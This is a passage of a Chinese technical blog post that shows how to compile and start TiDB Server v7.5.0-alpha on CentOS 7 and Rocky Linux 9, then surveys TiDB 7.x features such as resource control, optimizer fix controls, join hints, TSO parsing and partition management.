<p>与前几篇文章有所区别的是，本文使用 CentOS 7.9 和 Rocky Linux 9.2 两个版本的操作系统，分别进行编译测试。由于 TiDB Server 是 go 语言开发，所以在两个系统编译过程几乎没有区别，只需注意在编译之前安装系统开发工具包（<code>yum groupinstall 'Development Tools'</code>）。现已支持 Rocky Linux 9.1 及以上版本，可以在生产环境放心使用。<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></p>
<p>查看版本信息：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cat /etc/redhat-release</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure></div>
<p>输出日志：</p>
<ul>
<li>CentOS 7</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 ~]$ cat /etc/redhat-release</span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line">[shawnyan@centos7 ~]$ uname -a</span><br><span class="line">Linux centos7.shawnyan.cn 3.10.0-1160.92.1.el7.x86_64 #1 SMP Tue Jun 20 11:48:01 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Rocky Linux 9</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 ~]# cat /etc/redhat-release </span><br><span class="line">Rocky Linux release 9.2 (Blue Onyx)</span><br><span class="line">[root@rocky9 ~]# uname -a</span><br><span class="line">Linux rocky9.shawnyan.cn 5.14.0-284.11.1.el9_2.x86_64 #1 SMP PREEMPT_DYNAMIC Tue May 9 17:09:15 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></div>
<p>在 TiDB v7.5.0-alpha 的代码中，Go 版本升级到 1.21.1 (released 2023-08-08)<sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup><sup class="footnote-ref"><a href="#fn4" id="fnref4">[4]</a></sup>。本文所使用的 Go 版本为 1.21.3 (released 2023-10-10)<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">go install golang.org/dl/go1.21.3@latest</span><br><span class="line">go1.21.3 download</span><br><span class="line">go1.21.3 version</span><br></pre></td></tr></table></figure></div>
<!--
wget https://studygolang.com/dl/golang/go1.21.3.linux-amd64.tar.gz
tar zxvf go1.21.3.linux-amd64.tar.gz
sudo mv go /opt
-->
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">go version go1.21.3 linux/amd64</span><br></pre></td></tr></table></figure></div>
<p>Ps. 同时，关于 Go 版本，给 QE 团队提了个 Issue：</p>
<ul>
<li><a class="link"   href="https://github.com/PingCAP-QE/ci/issues/2507" >[Closed] update go v1.21.3 #2507 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<blockquote>
<p>Update: 2023-10-17</p>
</blockquote>
<p>TiDB 源码仓库新建了 <a class="link"   href="https://github.com/pingcap/tidb/tree/release-7.5" >release-7.5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 分支，并且 Go 版本升级到了 1.21.3。<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup></p>
<h3 id="1-2-编译步骤">1.2 编译步骤</h3>
<p>克隆下载源码到本地，这里指定 <code>v7.5.0-alpha</code> 分支。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/pingcap/tidb.git --depth=1 -b v7.5.0-alpha tidb7</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> tidb7</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git lg</span></span><br><span class="line">* 8cfe7f3 - (grafted, HEAD -&gt; v7.5.0-alpha, tag: v7.5.0-alpha) executor, tests:  move some test cases from `admin_test.go` and `foreign_key_test.go` to  `integrationtest` (#47333) (12 days ago) &lt;SeaRise&gt;</span><br></pre></td></tr></table></figure></div>
<p>编译 TiDB Server 仅需一条命令搞定。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure></div>
<p>输出日志：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 tidb7]$ make</span><br><span class="line">CGO_ENABLED=1 GO111MODULE=on go build  -tags codes  -ldflags &#x27;-X &quot;github.com/pingcap/tidb/parser/mysql.TiDBReleaseVersion=v7.5.0-alpha&quot; -X &quot;github.com/pingcap/tidb/util/versioninfo.TiDBBuildTS=2023-10-11 06:08:32&quot; -X &quot;github.com/pingcap/tidb/util/versioninfo.TiDBGitHash=8cfe7f329b56899a96422596da2b67d4e2bd1e94&quot; -X &quot;github.com/pingcap/tidb/util/versioninfo.TiDBGitBranch=HEAD&quot; -X &quot;github.com/pingcap/tidb/util/versioninfo.TiDBEdition=Community&quot; &#x27; -o bin/tidb-server ./tidb-server</span><br><span class="line">Build TiDB Server successfully!</span><br></pre></td></tr></table></figure></div>
<p>查看二进制文件的版本：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 bin]$ ./tidb-server -V</span><br><span class="line">Release Version: v7.5.0-alpha</span><br><span class="line">Edition: Community</span><br><span class="line">Git Commit Hash: 8cfe7f329b56899a96422596da2b67d4e2bd1e94</span><br><span class="line">Git Branch: HEAD</span><br><span class="line">UTC Build Time: 2023-10-11 06:08:32</span><br><span class="line">GoVersion: go1.21.3</span><br><span class="line">Race Enabled: false</span><br><span class="line">Check Table Before Drop: false</span><br><span class="line">Store: unistore</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>Update: 2023-10-16</p>
</blockquote>
<p>TiDB 仓库的代码结构发生了大调整，TiDB Server 核心文件移动到了新目录 <code>pkg</code> <sup class="footnote-ref"><a href="#fn7" id="fnref7">[7]</a></sup>，这一变更影响到近 4500 个文件。随之而来的好处是，TiDB 源码根目录更加清晰。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[shawnyan@centos7 tidb7]$ tree . -L 1</span><br><span class="line">.</span><br><span class="line">├── br                    --&gt; BR</span><br><span class="line">├── build</span><br><span class="line">...</span><br><span class="line">├── cmd</span><br><span class="line">...</span><br><span class="line">├── docs</span><br><span class="line">├── dumpling               --&gt; Dumpling</span><br><span class="line">...</span><br><span class="line">├── pkg                    --&gt; TiDB core</span><br><span class="line">...</span><br><span class="line">├── tests</span><br><span class="line">├── tools</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">10 directories, 24 files</span><br></pre></td></tr></table></figure></div>
<h3 id="1-3-启动-TiDB-Server">1.3 启动 TiDB Server</h3>
<p>TiDB Server 其实可以不依赖于 TiKV 而单独启动，这里选择单机存储引擎 UniStore 启动 TiDB Server，启动命令如下。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./tidb-server -store unistore</span><br></pre></td></tr></table></figure></div>
<p>启动后，连接 TiDB，并查看版本信息。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">select</span> tidb_version()\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">tidb_version(): <span class="keyword">Release</span> Version: v7<span class="number">.5</span><span class="number">.0</span><span class="operator">-</span>alpha</span><br><span class="line">Edition: Community</span><br><span class="line">Git <span class="keyword">Commit</span> Hash: <span class="number">8</span>cfe7f329b56899a96422596da2b67d4e2bd1e94</span><br><span class="line">Git Branch: HEAD</span><br><span class="line">UTC Build <span class="type">Time</span>: <span class="number">2023</span><span class="number">-10</span><span class="number">-11</span> <span class="number">06</span>:<span class="number">08</span>:<span class="number">32</span></span><br><span class="line">GoVersion: go1<span class="number">.21</span><span class="number">.3</span></span><br><span class="line">Race Enabled: <span class="literal">false</span></span><br><span class="line"><span class="keyword">Check</span> <span class="keyword">Table</span> Before <span class="keyword">Drop</span>: <span class="literal">false</span></span><br><span class="line">Store: unistore</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是，TiDB Server 的参数分为命令行参数（直接启动 Server 时传递的参数）<sup class="footnote-ref"><a href="#fn8" id="fnref8">[8]</a></sup>，配置文件参数（比命令行参数更丰富）<sup class="footnote-ref"><a href="#fn9" id="fnref9">[9]</a></sup>，以及系统变量（连接 TiDB 后可修改）<sup class="footnote-ref"><a href="#fn10" id="fnref10">[10]</a></sup>，所以在查看官方文档的时候，这三类参数的页面都可能用到，概念上的变量和参数非常容易混淆，如果接触 TiDB 时间不长，需要多加区分、辨别。</p>
<p>BTW，关于这部分的内容，欢迎学习、复习 PingCAP 相关课程：</p>
<ul>
<li><a class="link"   href="https://learn.pingcap.com/learner/course/30002" >TiDB 系统管理基础 [TiDB v5.x] (301) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，第十课: TiDB 的配置</li>
</ul>
<img  alt="t01-301-tidb-config.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://tidb-blog.oss-cn-beijing.aliyuncs.com/media/t01-301-tidb-config-1697647536009.png"
                      referrerpolicy="no-referrer"
                >
<p>到此，我们可以看到 TiDB Server 已经编译成功，并成功启动运行，TiDB Server 的版本为 <code>v7.5.0-alpha</code>。</p>
<h2 id="font-color-0080FF-二、TiDB-Server-v7-x-新特性-font"><font color='#0080FF'>二、TiDB Server v7.x 新特性</font></h2>
<p>依据现行 TiDB 发版规则，<strong>TiDB 7.5.0 LTS 版本将包含 7.2.0-DMR (Released: 2023-06-29)，7.3.0-DMR (Released: 2023-08-14) 和 7.4.0-DMR (Released: 2023-10-12) 中已发布的新特性。</strong> 下面的篇幅将介绍若干 TiDB 7.x 的新特性。</p>
<h3 id="🔑-font-color-0080FF-2-1-资源管控能力增强-font">🔑 <font color='#0080FF'>2.1 资源管控能力增强</font></h3>
<p>在 TiDB 7.1.0 LTS 中，资源管控特性正式发布，这部分的详细内容请参考文章：</p>
<p>《 <a class="link"   href="https://mp.weixin.qq.com/s/0r_LE4uZX7ENNAvFJhy4Dg" >TiDB 7.1.0 LTS 特性解读丨关于资源管控 (Resource Control) 应该知道的 6 件事 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 》</p>
<p>在 TiDB 7.4.0 DMR 中，资源管控能力得到增强，引入了对后台任务的管理。主要实现在 TiKV 层。</p>
<blockquote>
<p>当一种任务被标记为后台任务时，TiKV 会动态地限制该任务的资源使用，以尽量避免此类任务在执行时对其他前台任务的性能产生影响。TiKV 通过实时地监测所有前台任务所消耗的 CPU 和 IO 等资源，并根据实例总的资源上限计算出后台任务可使用的资源阈值，所有后台任务在执行时会受此阈值的限制。</p>
</blockquote>
<p>同时，在 v7.4.0 中，TiFlash 支持资源管控特性，完善了 TiDB 整体的资源管控能力。<a class="link"   href="https://github.com/pingcap/tiflash/issues/7660" >#7660 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="🥳-font-color-0080FF-2-2-TiDB-相关-SQL-再扩展-font">🥳 <font color='#0080FF'>2.2 TiDB 相关 SQL 再扩展</font></h3>
<p>之前的文章 《 <a href="https://shawnyan.cn/2023/tidb/tidb-7.1-resource-control/#font-color-0080FF-2-%E2%80%9C%E8%B5%84%E6%BA%90%E6%8E%A7%E5%88%B6%E2%80%9D%E7%9B%B8%E5%85%B3-SQL%EF%BC%8C%E7%94%A8%E8%BF%99%E4%BA%9B%E5%B0%B1%E5%A4%9F%E4%BA%86-font">TiDB 7.1.0 LTS 特性解读 | 资源管控 (Resource Control) 应该知道的 6 件事</a> 》 中，增加了“资源管控”相关 SQL，这里再次进行扩展，也是本文的第一个彩蛋。</p>
<h4 id="1️⃣-TiDB-7-1-0，新增支持-Fix-Control-特性">1️⃣ TiDB 7.1.0，新增支持 Fix Control 特性</h4>
<p>从 TiDB v7.1.0 开始，支持 <a class="link"   href="https://docs.pingcap.com/zh/tidb/dev/optimizer-fix-controls" >Optimizer Fix Controls <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 特性，并引入 <code>tidb_opt_fix_control</code> 系统变量，以更细粒度控制优化器行为。</p>
<p>现在，该变量支持全局、会话、Hint，三种方式进行控制，正式发布支持的控制项有 6 个，另有 1 个已合入 Master，预计会随下个版本发布，具体列表如下。</p>
<ul>
<li><a class="link"   href="https://github.com/pingcap/tidb/issues/44262" >44262 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> – New in v7.2.0/v7.1.1
<ul>
<li>控制是否允许使用动态模式访问没有全局统计信息的分区表。</li>
</ul>
</li>
<li><a class="link"   href="https://github.com/pingcap/tidb/issues/44389" >44389 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> – New in v7.2.0/v7.1.1
<ul>
<li>控制在构建范围时是否考虑某些 CNF 项的非点范围（non-point ranges）。</li>
</ul>
</li>
<li><a class="link"   href="https://github.com/pingcap/tidb/issues/44823" >44823 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> – New in v7.3.0/v7.1.1
<ul>
<li>控制可以在计划缓存中缓存的查询参数的最大数量。</li>
</ul>
</li>
<li><a class="link"   href="https://github.com/pingcap/tidb/issues/44830" >44830 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> – New in v7.3.0
<ul>
<li>控制是否允许缓存某些复杂场景中的 Batch/PointGet。</li>
</ul>
</li>
<li><a class="link"   href="https://github.com/pingcap/tidb/issues/44855" >44855 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> – New in v7.3.0/v7.1.1
<ul>
<li>控制在估计索引连接内侧下索引范围扫描的行数时是否使用更准确的上限。</li>
</ul>
</li>
<li><a class="link"   href="https://github.com/pingcap/tidb/issues/45132" >45132 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> – New in v7.4.0
<ul>
<li>控制是否使用访问范围行计数来确定 Skyline 修剪上的访问路径。</li>
</ul>
</li>
<li><a class="link"   href="https://github.com/pingcap/tidb/issues/45798" >45798 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> – New in v7.5.0 ??? TBD
<ul>
<li>控制是否缓存访问生成列的计划。</li>
</ul>
</li>
</ul>
<p>基础用法示例如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> @<span class="variable">@tidb_opt_fix_control</span><span class="operator">=</span><span class="keyword">default</span>;</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@tidb_opt_fix_control</span>;</span><br><span class="line"><span class="keyword">SET</span> SESSION tidb_opt_fix_control <span class="operator">=</span> <span class="string">&#x27;44262:ON,44389:ON,44823:500,44830:ON,44855:ON,45132:0,45798:ON&#x27;</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> tidb_opt_fix_control <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="comment">/*+ set_var(tidb_opt_fix_control=&quot;1:ok&quot;) */</span> @<span class="variable">@tidb_opt_fix_control</span>;</span><br></pre></td></tr></table></figure></div>
<h4 id="2️⃣-TiDB-7-2-0，支持对-DDL-任务进行暂停和恢复">2️⃣ TiDB 7.2.0，支持对 DDL 任务进行暂停和恢复</h4>
<p>TiDB 7.2 引入了新的实验特性，DDL 任务支持暂停（PAUSE）<sup class="footnote-ref"><a href="#fn11" id="fnref11">[11]</a></sup>和恢复（RESUME）操作，比如，对正在创建索引的任务进行暂停和恢复。相关命令如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ADMIN PAUSE DDL JOBS job_id [, job_id]</span><br><span class="line">ADMIN RESUME DDL JOBS job_id [, job_id]</span><br></pre></td></tr></table></figure></div>
<h4 id="3️⃣-TiDB-7-3-0，新增支持-8-项-Optimizer-Hint">3️⃣ TiDB 7.3.0，新增支持 8 项 Optimizer Hint</h4>
<p>从 TiDB 7.3.0 开始，新增支持 8 (4+1+3) 项表级别 Optimizer Hint，这一特性也在 TiDB v7.1.1 中引入。</p>
<p>“4+1+3” 的意思是，增加 4 个名为 <code>NO_xxx_JOIN</code> 的 TiDB Hint，兼容（MySQL）一个名为 <code>NO_HASH_JOIN</code><sup class="footnote-ref"><a href="#fn12" id="fnref12">[12]</a></sup> 的 Hint，以及，增加 3 个名为 <code>INDEX_xxx_JOIN</code> 的 TiDB Hint，具体名称如下。</p>
<div class="highlight-container" data-rel="Yaml"><figure class="iseeu highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">NO_INDEX_JOIN</span></span><br><span class="line"><span class="string">NO_INDEX_HASH_JOIN</span></span><br><span class="line"><span class="string">NO_INDEX_MERGE_JOIN</span></span><br><span class="line"><span class="string">NO_MERGE_JOIN</span></span><br><span class="line"></span><br><span class="line"><span class="string">NO_HASH_JOIN</span></span><br><span class="line"></span><br><span class="line"><span class="string">INDEX_JOIN</span></span><br><span class="line"><span class="string">INDEX_HASH_JOIN</span></span><br><span class="line"><span class="string">INDEX_MERGE_JOIN</span></span><br></pre></td></tr></table></figure></div>
<p>此外，在使用 Hint 时，如果 <code>INDEX_xxx_JOIN</code> 与 <code>NO_INDEX_xxx_JOIN</code> 发生冲突，<code>NO_INDEX_xxx_JOIN</code> 可能会被忽略。</p>
<p>另外一个知识点，在 TiDB 中，<code>TIDB_INLJ</code> 是 <code>INL_JOIN</code> 的别名。</p>
<blockquote>
<p>在 3.0.x 及之前版本仅支持使用该别名；之后的版本同时支持使用这两种名称，但推荐使用 <code>INL_JOIN</code>。<sup class="footnote-ref"><a href="#fn13" id="fnref13">[13]</a></sup></p>
</blockquote>
<div class="highlight-container" data-rel="Go"><figure class="iseeu highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TiDB hint aliases</span></span><br><span class="line"><span class="string">&quot;TIDB_HJ&quot;</span>:   hintHashJoin,	-&gt; HASH_JOIN</span><br><span class="line"><span class="string">&quot;TIDB_INLJ&quot;</span>: hintInlJoin,	-&gt; INL_JOIN</span><br><span class="line"><span class="string">&quot;TIDB_SMJ&quot;</span>:  hintSMJoin,	-&gt; MERGE_JOIN</span><br></pre></td></tr></table></figure></div>
<p>在使用方法上，还可以结合 <code>SEV_VAR</code> Hint 使用，本文下面有章节会再介绍。</p>
<p>示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">explain format <span class="operator">=</span> <span class="string">&#x27;hint&#x27;</span> </span><br><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line"><span class="comment">/*+ NO_INDEX_JOIN(t1),NO_INDEX_HASH_JOIN(t1),NO_INDEX_MERGE_JOIN(t1),NO_MERGE_JOIN(t1)</span></span><br><span class="line"><span class="comment">,NO_HASH_JOIN(t1),INDEX_JOIN(t1),INDEX_HASH_JOIN(t1),INDEX_MERGE_JOIN(t1) */</span> </span><br><span class="line"><span class="operator">*</span> </span><br><span class="line"><span class="keyword">FROM</span> t1\G</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> explain format <span class="operator">=</span> <span class="string">&#x27;hint&#x27;</span>  <span class="keyword">SELECT</span>  <span class="comment">/*+ NO_INDEX_JOIN(t1),NO_INDEX_HASH_JOIN(t1),NO_INDEX_MERGE_JOIN(t1),NO_MERGE_JOIN(t1) ,NO_HASH_JOIN(t1),INDEX_JOIN(t1),INDEX_HASH_JOIN(t1),INDEX_MERGE_JOIN(t1) */</span>  <span class="operator">*</span>  <span class="keyword">FROM</span> t1\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">hint: use_index(@`sel_1` `test`.`t1` `idx_t1`), no_order_index(@`sel_1` `test`.`t1` `idx_t1`), no_index_join(), no_index_hash_join(), no_index_merge_join(), no_merge_join(), no_hash_join(), index_join(), index_hash_join(), index_merge_join()</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>相关 PR 参见：<a class="link"   href="https://github.com/pingcap/tidb/pull/45525" >parser: support more join hints on parser #45525 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>具体相关文档参见：<a class="link"   href="https://docs.pingcap.com/zh/tidb/dev/optimizer-hints" >Optimizer Hints <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Ps. 文档有部分描述缺失，已提 Issue，期待更新。</p>
<ul>
<li><a class="link"   href="https://github.com/pingcap/docs-cn/issues/15358" >[Open] docs: add description about optimizer hint #15358 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h4 id="4️⃣-TiDB-7-4-0，新增支持-TIDB-PARSE-TSO-LOGICAL-语法">4️⃣ TiDB 7.4.0，新增支持 <code>TIDB_PARSE_TSO_LOGICAL()</code> 语法</h4>
<p>对于 TSO，如果想查看逻辑计数器，之前的版本需要通过 pd 命令进行解析，从 7.4 开始支持直接从 TiDB 进行查询。</p>
<blockquote>
<p>TSO 指 Time Stamp Oracle，是 PD (Placement Driver) 为每个事务提供的单调递增的时间戳。TSO 是一串数字，包含以下两部分：一个物理时间戳； 一个逻辑计数器<sup class="footnote-ref"><a href="#fn14" id="fnref14">[14]</a></sup></p>
</blockquote>
<p>示例：获取物理时间戳和逻辑计数器的值。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">select</span> @<span class="variable">@tidb_current_ts</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> @<span class="variable">@tidb_current_ts</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">444995429049565185</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">SELECT</span> TIDB_PARSE_TSO(@<span class="variable">@tidb_current_ts</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> TIDB_PARSE_TSO(@<span class="variable">@tidb_current_ts</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2023</span><span class="number">-10</span><span class="number">-17</span> <span class="number">15</span>:<span class="number">07</span>:<span class="number">26.411000</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">tidb<span class="operator">&gt;</span> <span class="keyword">SELECT</span> TIDB_PARSE_TSO_LOGICAL(@<span class="variable">@tidb_current_ts</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> TIDB_PARSE_TSO_LOGICAL(@<span class="variable">@tidb_current_ts</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                         <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>与 pd 命令解析的结果一致。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">tidb<span class="operator">&gt;</span> \<span class="operator">!</span> tiup ctl:v7<span class="number">.4</span><span class="number">.0</span> pd tso <span class="number">444995429049565185</span></span><br><span class="line">The component `ctl` version v7<span class="number">.4</span><span class="number">.0</span> <span class="keyword">is</span> <span class="keyword">not</span> installed; downloading <span class="keyword">from</span> repository.</span><br><span class="line">Starting component `ctl`: <span class="operator">/</span>home<span class="operator">/</span>shawnyan<span class="operator">/</span>.tiup<span class="operator">/</span>components<span class="operator">/</span>ctl<span class="operator">/</span>v7<span class="number">.4</span><span class="number">.0</span><span class="operator">/</span>ctl pd tso <span class="number">444995429049565185</span></span><br><span class="line"><span class="keyword">system</span>:  <span class="number">2023</span><span class="number">-10</span><span class="number">-17</span> <span class="number">15</span>:<span class="number">07</span>:<span class="number">26.411</span> <span class="operator">+</span><span class="number">0800</span> CST</span><br><span class="line">logic:   <span class="number">1</span></span><br><span class="line">tidb<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></div>
<h4 id="5️⃣-TiDB-7-4-0，新增支持分区类型管理功能">5️⃣ TiDB 7.4.0，新增支持分区类型管理功能</h4>
<p>TiDB 7.4 的分区表管理功能更加完备，期待已久的普通表转分区表功能终于上线。<sup class="footnote-ref"><a href="#fn15" id="fnref15">[15]</a></sup></p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 将非分区表转为分区表、修改分区表的分区类型</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> <span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="operator">&lt;</span><span class="keyword">new</span> <span class="keyword">partition</span> type <span class="keyword">and</span> definitions<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将分区表转为非分区表</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="operator">&lt;</span>table_name<span class="operator">&gt;</span> REMOVE PARTITIONING</span><br></pre></td></tr></table></figure></div>
<p>举个栗子，将既存表按年龄划定分区，分区类型使用 <code>RANGE</code>，然后将分区类型变更为 <code>LIST</code>，最后移除分区。</p>
